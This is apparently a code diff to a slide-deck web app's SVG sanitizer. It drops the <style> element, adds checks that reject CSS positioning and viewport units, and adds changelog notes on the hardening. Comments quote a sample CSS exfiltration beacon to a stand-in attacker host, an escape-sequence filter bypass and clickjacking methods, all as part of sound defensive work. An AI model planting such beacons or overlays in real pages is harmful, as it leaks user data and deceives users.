@@ -135,8 +135,13 @@ const velaClipboardReadSlides = async () => {
   return [];
 };
 
-const VELA_VERSION = "13.31";
+const VELA_VERSION = "13.36";
 const VELA_CHANGELOG = [
+  { v: "13.36", d: ["CI hardening: the SVG-<style> recurrence guard now scans every part-file (not a hardcoded list that had drifted), forbids built-in prototype tampering that the sanitizer's tag lookup relies on, requires the redress/overlay tests to keep their real assertions, and fails (never skips) if the sanitizer source can't be located. Added a PART_ORDER-completeness guard.", "Housekeeping: added the missing license header to the PPTX export part-file."] },
+  { v: "13.35", d: ["Security (High): the SVG inline style filter now also rejects CSS layout/positioning (position/inset/z-index/pointer-events/viewport-sizing), closing a UI-integrity gap where a positioned SVG element could overlay or clickjack app chrome from a non-clipped diagram panel — the same redress/clickjack class, via the inline-style path rather than the <style> element. SVG paint styling is unaffected.", "CI hardening: security sanitizer regression tests are now un-skippable at runtime (a skip is failed), and the allowlist-tamper guard also catches aliased membership overrides — closing seams where a regression could reach green CI."] },
+  { v: "13.34", d: ["CI hardening: the SVG-<style> exclusion lint now also rejects runtime tampering with the tag allowlist (membership-method override / reassignment), and requires the real-runtime redress regression test to always run (security UI tests can't be marked skippable) — closing two seams where the element could be re-admitted with green CI.", "Test fix: the student-mode teacher-panel tests now navigate to a notes-free slide instead of being AI-gated, restoring real coverage of the panel shell."] },
+  { v: "13.33", d: ["Test integrity: the in-app UI battery now fails a test whose assertion returns false — previously only a thrown error failed a test, so return-based checks (incl. the SVG-<style> redress regression) never failed. Corrected 5 pre-existing tests this surfaced (4 AI-gated, 1 stale selector).", "CI: hardened the SVG-<style> exclusion lint to verify runtime semantics — it now rejects dynamic or escaped allowlist constructions that could re-admit the element past a byte-level check."] },
+  { v: "13.32", d: ["Security (High): the deck SVG sanitizer no longer allows a `<style>` element, closing a UI-integrity gap where document-global CSS could restyle/relocate/re-label the app's own controls (a redress class, escalatable to clickjacking a one-click action). Deck paint uses element-local presentation attributes instead.", "Added a new UI-integrity threat-model invariant, a browser regression test proving deck SVG cannot affect app chrome, and a lint guard preventing re-introduction."] },
   { v: "13.31", d: "Security (defense-in-depth): unified table-cell Markdown escaping into one complete pass (backslash escaped alongside pipe), resolving a static-analysis incomplete-escaping finding; no behavior change." },
   { v: "13.30", d: ["Security (defense-in-depth): adversarial review hardened the 13.29 fixes to rock-solid. The dev-server deck listing now refuses to follow a symlinked entry at open time, closing a check/use race rather than relying on a prior path check. Markdown export now applies complete Markdown-context output encoding to every deck-text field at the sink — link/image destinations, reference-style syntax, raw HTML and autolinks, code fences and tables — with matching HTML-stripping of the contributing text fields at import.", "Extensive regression tests added."] },
   { v: "13.29", d: ["Security (Medium, defense-in-depth): the local dev-server deck listing now enforces the same folder-containment check as every other file endpoint, closing a symlink-escape information disclosure.", "Security (Medium): the local AI channel now requires an authentication token unconditionally and no longer treats a request's Origin as an access boundary, closing an opaque-origin cross-origin access class.", "Security (Low, defense-in-depth): Markdown export now routes deck text through the shared URL-scheme allowlist and Markdown-context output encoding, reaching parity with the live renderer and closing a link/image injection class.", "Regression tests added across all three."] },
@@ -560,7 +565,16 @@ const SVG_ALLOWED_TAGS = new Set([
   // common-but-needs-care (each has explicit attribute filtering downstream)
   "a",      // href passes scheme allowlist
   "image",  // href/xlink:href pass scheme allowlist
-  "style",  // textContent passes isSvgStyleSafe; walk descends to strip CDATA/comment/PI
+  // SECURITY: <style> is deliberately NOT allowed. An inline <style> injected via
+  // dangerouslySetInnerHTML applies DOCUMENT-GLOBAL CSS (the cascade is not scoped
+  // to the SVG subtree), so deck-supplied selectors + declarations could restyle,
+  // hide, relocate, or re-label the trusted application UI — i.e. redress and
+  // clickjack real controls. A deck value must never alter the presentation,
+  // geometry, hit-testing, or labeling of app chrome (UI-integrity invariant).
+  // Legitimate deck paint needs only presentation attributes (fill="url(#id)",
+  // gradients, markers), which remain allowed and validated. isSvgStyleSafe (below)
+  // is retained for the inline style="" attribute and url-ref presentation
+  // attributes, whose reach is element-local, not cascade-global.
 ]);
 
 // SVG attributes whose value can carry a functional URL reference that the
@@ -574,13 +588,16 @@ const SVG_URL_REF_ATTRS = new Set([
   "marker", "marker-start", "marker-mid", "marker-end", "cursor", "color-profile",
 ]);
 
-// SVG <style> CSS-text filter. The threat: <style>* { background: url("https://
-// attacker/?d=...") }</style> or @import url(...) fires an outbound GET on
-// render — zero-click exfil beacon with no CSP backstop inside the artifact
-// srcdoc. SAFE_STYLE_KEYS only filters the style="..." inline attribute, not
-// <style>-element CSS text. We allow url(#fragment) (SVG paint servers,
-// markers, gradients, clip-paths) and reject everything else that can hit
-// the network or use legacy code-execution constructs. CSS \XX escape
+// SVG CSS-value filter for the inline style="" attribute and url-ref
+// presentation attributes (fill/stroke/filter/mask/clip-path/marker/cursor).
+// The <style> ELEMENT is no longer allowed (see SVG_ALLOWED_TAGS) — a
+// document-global stylesheet is dropped outright, not filtered — so this guards
+// only element-local CSS values. The threat here: a value like
+// background:url("https://attacker/?d=...") or image-set("https://…") fires an
+// outbound GET on render — a zero-click exfil beacon with no CSP backstop inside
+// the artifact srcdoc. We allow url(#fragment) (SVG paint servers, markers,
+// gradients, clip-paths) and reject everything else that can hit the network or
+// use legacy code-execution constructs. CSS \XX escape
 // sequences can decode "url" / "@import" past a literal-token regex
 // (e.g. \75rl(…) → url(…)), so we conservatively reject any backslash.
 // Also reject any '<' or ']]>' — defense-in-depth against rawtext-breakout
@@ -627,6 +644,18 @@ function isSvgStyleSafe(css) {
   // image-set() bypass of the v12.53 url() exfil fix.
   const fnStr = css.match(/[a-z][\w-]*\s*\(\s*['"]/gi);
   if (fnStr && fnStr.some((m) => !/^url\s*\(/i.test(m))) return false;
+  // UI-integrity: reject CSS layout/positioning properties. SVG paint via inline
+  // style is fine (fill/stroke/opacity/stroke-width/…), but position/inset/z-index/
+  // pointer-events let a deck element ESCAPE its container and overlay, hide, or
+  // clickjack the trusted app UI — the render sinks in the study-notes / teacher
+  // diagram panels are NOT inside a transform+overflow-hidden containing block, so a
+  // fixed-positioned SVG element reaches whole-app chrome. This mirrors the exclusion
+  // SAFE_STYLE_KEYS already enforces for block.style; the SVG inline-style path (and
+  // the presentation-attr values that share this filter) must consult the same bar.
+  if (/(?:^|[;{}\s])(?:position|top|left|right|bottom|inset(?:-block|-inline)?(?:-start|-end)?|z-index|pointer-events)\s*:/i.test(css)) return false;
+  // Viewport-relative sizing is itself an overlay primitive (a 100vw×100vh element);
+  // legit SVG paint never needs it.
+  if (/\b[\d.]+(?:vw|vh|vmin|vmax|vi|vb|dvw|dvh|dvi|dvb|svw|svh|lvw|lvh|cqw|cqh|cqi|cqb)\b/i.test(css)) return false;
   return true;
 }
 
@@ -677,21 +706,11 @@ function sanitizeSvgMarkup(raw) {
           // differently at the HTML dangerouslySetInnerHTML sink. Drop anything
           // outside the SVG namespace. Mirrors DOMPurify's _checkValidNamespace.
           if (child.namespaceURI !== "http://www.w3.org/2000/svg") { child.remove(); continue; }
-          if (tag === "style") {
-            if (!isSvgStyleSafe(child.textContent || "")) { child.remove(); continue; }
-            // SECURITY: strip EVERY attribute from <style> — do NOT skip the
-            // attribute pass. <style> is a common SVG/HTML element, so on the
-            // dangerouslySetInnerHTML HTML re-parse any surviving handler goes
-            // live (mutation-XSS). Legitimate SVG <style> needs no attribute we
-            // keep (type/media are inert and optional), so drop them all
-            // uniformly rather than trusting an element-specific shortcut. (v13.19)
-            for (const a of Array.from(child.attributes)) child.removeAttribute(a.name);
-            // Still descend so the nodeType filter above strips any CDATA/comment/PI
-            // children. CDATA serializes literally and a smuggled `</style>` inside
-            // it escapes rawtext when re-parsed as HTML, yielding a live handler.
-            walk(child);
-            continue;
-          }
+          // <style> is not in SVG_ALLOWED_TAGS (removed at the allowlist check
+          // above) — an inline stylesheet is document-global, not SVG-scoped, so
+          // it is dropped outright rather than filtered. isSvgStyleSafe still runs
+          // on the inline style="" attribute and url-ref attrs (element-local reach)
+          // in the attribute pass below.
           const attrs = Array.from(child.attributes);
           for (const a of attrs) {
             const name = a.name.toLowerCase();
